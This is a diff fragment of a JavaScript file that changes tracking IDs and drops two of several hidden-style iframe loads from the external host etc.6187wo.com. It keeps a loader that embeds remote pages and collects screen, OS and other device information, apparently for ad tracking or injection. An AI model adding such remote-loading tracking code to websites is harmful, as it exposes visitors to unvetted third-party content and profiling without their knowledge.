@@ -4,13 +4,11 @@ window.curNode = document.currentScript || (function() {
 })();
 var s_w = window.screen.width;
 
-var trackid = '10214';
-var trackidmd5 = '84516ad48d35c44f41688ce1313fac1d';
-var statid = '1280230905'
+var trackid = '10216';
+var trackidmd5 = '9d76f3564bd92dec0deb0dac96b64761';
+var statid = '1280246693'
 
 var core_url = '//etc.6187wo.com/' + trackid + '/' + trackidmd5 + '/Core.html#s_w=' + s_w;
-var Tissue1001 = '//etc.6187wo.com/Tissue1001.html#s_w='+s_w;
-var Collect_Url = '//etc.6187wo.com/Collect.html#s_w=' + s_w;
 function Core(url) {
     var d = document.createElement("div");
     var c = document.createElement("iframe");
@@ -138,7 +136,5 @@ function getOS() {
 }
 Core(core_url);
 Core(core_url);
-Core(Collect_Url);
-Core(Tissue1001);
 GetInfo();
 Statistics(statid);
